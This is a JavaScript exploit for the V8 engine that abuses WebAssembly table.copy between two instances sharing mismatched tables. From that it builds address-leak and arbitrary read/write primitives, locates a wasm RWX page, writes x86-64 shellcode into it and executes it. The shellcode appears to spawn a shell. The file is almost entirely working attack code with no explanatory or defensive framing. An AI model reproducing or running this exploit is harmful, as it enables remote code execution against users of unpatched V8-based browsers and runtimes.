load('v8/test/mjsunit/wasm/wasm-module-builder.js');

let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}

let instance;
let instance2;
let table1 = new WebAssembly.Table({initial:0x10, maximum:0x10, element: "anyfunc"});
let table2 = new WebAssembly.Table({initial:0x100, maximum:0x100, element: "anyfunc"});
let a,b,c,d;
{
  let builder = new WasmModuleBuilder();

  const void_sig = builder.addType(kSig_i_i);

  const func_index = builder.addImport("q","func",void_sig);
  let sig_v_iii = builder.addType(kSig_v_iii);

  builder.addExport("hack", func_index);

  const table_index1 = builder.addImportedTable("q", "table1", 0x10, 0x10);
  const table_index2 = builder.addImportedTable("q", "table2", 0x100, 0x100);
  builder.addFunction("copy", sig_v_iii)
  .addBody([
    kExprGetLocal, 0,
    kExprGetLocal, 1,
    kExprGetLocal, 2,
    kNumericPrefix, kExprTableCopy, table_index1, table_index1])
  .exportAs("copy");

  let wasm_m = builder.toModule();

  let func = (v)=>{
    return 1;
  }
  instance = new WebAssembly.Instance(wasm_m, {q:{table1:table1, table2:table2, func:func}});
  a = [0.1, 0.1, 0.1, 0.1, 0.1, 0.1];
  b = [1.1, 1.2, 1.3, 1.4, 1.5];
  c = [{}, 2.2, 2.3, 2.4, 2.5, 2.6, 2.7, 2.8];
  d = [3.1, 3.2, 3.3, 3.4];
}
{
  let builder = new WasmModuleBuilder();

  const void_sig = builder.addType(kSig_i_i);

  const func_index = builder.addImport("q","func",void_sig);
  let sig_v_iii = builder.addType(kSig_v_iii);

  builder.addExport("hack", func_index);

  const table_index1 = builder.addImportedTable("q", "table1", 0x100, 0x100);
  const table_index2 = builder.addImportedTable("q", "table2", 0x10, 0x10);
  builder.addFunction("copy", sig_v_iii)
  .addBody([
    kExprGetLocal, 0,
    kExprGetLocal, 1,
    kExprGetLocal, 2,
    kNumericPrefix, kExprTableCopy, table_index1, table_index1])
  .exportAs("copy");

  let wasm_m = builder.toModule();
  let func = (v)=>{
    return 1;
  }
  instance2 = new WebAssembly.Instance(wasm_m, {q:{table1:table2, table2:table1, func:func}});
}
const a_index = 69;
const b_index = 81;
const c_index = 92;
const a_backing_store = 69 + 8;
const BACKING_POINTER_OFFSET = 15n;
let old ;
function addr_of(obj){
	c[0] = obj;
	instance2.exports.copy(a_index, c_index, 0x1);
	let r = a[0].f2i();
	return r;
}
function arb_read(addr){
	instance2.exports.copy(b_index, a_backing_store, 0x1);
	old = b[0];
	b[0] = (addr-BACKING_POINTER_OFFSET).i2f();
	instance2.exports.copy(a_backing_store, b_index, 0x1);
	let r = a[0].f2i();
	b[0] = old;
	instance2.exports.copy(a_backing_store, b_index, 0x1);
	return r;
}

function arb_write(addr, val){
	instance2.exports.copy(b_index, a_backing_store, 0x1);
	old = b[0];
	b[0] = (addr-BACKING_POINTER_OFFSET).i2f();
	instance2.exports.copy(a_backing_store, b_index, 0x1);
	a[0] = val.i2f();
	b[0] = old;
	instance2.exports.copy(a_backing_store, b_index, 0x1);
}
let leak_addr = addr_of({});
arb_read(leak_addr);
let test_backing = old.f2i() + BACKING_POINTER_OFFSET;

if(arb_read(test_backing+8n).i2f() != 0.1){
	throw "[-] arb_read failed";
}

arb_write(test_backing+8n, (1.337).f2i());
if(a[1] != 1.337){
	throw "[-] arb_write failed";
}
console.log("[+] success arb r/w ");
wasm_i_addr = addr_of(instance);
//console.log("[+] wasm instance : "+ wasm_i_addr.hex());

wasm_f_addr = arb_read(wasm_i_addr + BigInt(17*8 -1));
console.log("[+] rwx page : "+ wasm_f_addr.hex());

let wtf = arb_read(test_backing-16n+ 8n)
arb_write(test_backing-16n+ 8n, (0x1234).smi2f().f2i());
a.length = 0x1234;
let shellcode = [
    0x91969dd1bb48c031n,
    0x53dbf748ff978cd0n,
    0xb05e545752995f54n,
    0xcccccccccc050f3bn,
];
for(var i =0; i < shellcode.length; i++){
	a[19] = (wasm_f_addr+0x380n + BigInt(8*i) - BACKING_POINTER_OFFSET).i2f();
	b[0] = (shellcode[i]).i2f();
}
instance.exports.copy();